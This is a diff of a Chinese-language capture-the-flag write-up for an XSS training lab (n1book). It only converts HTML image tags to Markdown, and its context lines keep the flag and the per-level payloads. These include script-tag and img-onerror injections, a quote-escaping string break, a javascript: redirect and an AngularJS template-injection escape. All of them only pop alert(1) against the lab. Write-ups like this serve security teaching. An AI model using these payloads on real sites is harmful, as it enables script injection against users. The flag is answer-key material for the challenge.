@@ -7,12 +7,12 @@ Date: 2020-12-20
 `n1book{xss_is_so_interesting}`
 
 ## 思路
-1. 访问环境，依次闯关   
-<center><img src="./images/xss-1.png" width = 60%/></center>  
+1. 访问环境，依次闯关  
+![](./images/xss-1.png)
 2. level1，直接构造`username=<script>alert(1)</script>`  
-<center><img src="./images/xss-2.png" width = 60%/></center>
+![](./images/xss-2.png)
 3. level2，查看源码，用`'`闭合前面的`xss`，`//`注释掉后面的`';`，构造`username=xss';alert(1);//`  
-<center><img src="./images/xss-3.png" width = 60%/></center>
+![](./images/xss-3.png)
 3. level3，构造不存在的img源`<img src=1 onerror=alert(1)>`  
 4. level4，10s会重定向，分析源码需要传入`jumpUrl`参数，使用伪协议`?jumpUrl=javascript:alert(1)`
 ```javascript
@@ -65,7 +65,7 @@ if(getQueryVariable('autosubmit') !== false){
 		}
 ```
 7. level6，AngularJS模板注入，参考资料：[AngularJS模板注入XSS](https://nosec.org/home/detail/4153.html)   
-<center><img src="./images/xss-4.png" width = 60%/></center>
+![](./images/xss-4.png)
 
 获得payload：  
 `?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`
